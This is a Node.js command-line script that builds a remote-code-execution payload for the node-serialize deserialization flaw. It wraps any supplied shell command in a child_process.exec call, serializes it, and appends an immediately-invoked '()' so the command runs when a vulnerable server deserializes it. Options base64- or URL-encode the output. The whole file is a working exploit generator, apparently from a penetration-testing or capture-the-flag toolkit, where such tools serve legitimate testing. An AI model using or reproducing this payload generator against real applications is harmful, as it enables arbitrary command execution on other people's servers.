#!/usr/bin/env node

const parser = new require('argparse').ArgumentParser();
const serial = require("node-serialize");

parser.add_argument('payload', {help: "Payload to inject"});
parser.add_argument('-k', '--keyname', {help: "Key name", default:"rce"});
parser.add_argument('-u', '--urlencode', {help: "URLencode", action:"store_true"});
parser.add_argument('-b', '--base64', {help: "Encode in Base64", action:"store_true"});
const args = parser.parse_args();

// Object base
var y = {};
// Payload base
var fun = '(function(){require("child_process").exec("arg",function(error,stdout,stderr){console.log(stdout)})})'
// Making the JSON object
y[args.keyname] = eval(fun.replace('arg',args.payload));
// Serializing the payload
var buff = Buffer.from(serial.serialize(y),"utf-8").toString("utf-8");
// Making it invokable through IIFE (Immediately Invoked Function Expression)
var payload = buff.replace('}"}','}()"}');

if (args.base64) {
    payload = Buffer.from(payload).toString("base64");
}
if (args.urlencode){
    payload = encodeURIComponent(payload);
}

// Printing the output: node serialize.js <payload>
console.log(payload);
